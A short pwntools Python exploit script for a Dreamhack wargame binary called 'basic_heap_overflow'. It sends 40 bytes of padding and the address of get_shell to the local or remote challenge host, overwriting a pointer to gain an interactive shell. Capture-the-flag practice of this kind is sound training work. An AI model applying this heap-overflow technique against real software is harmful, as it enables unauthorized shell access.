#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_heap_overflow", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 13974)

    return p

def main():
    p = conn()

    input()

    # 32 bits: metadata 8
    p.sendline(b'a'*40 + p32(exe.sym['get_shell']))

    p.interactive()

if __name__ == "__main__":
    main()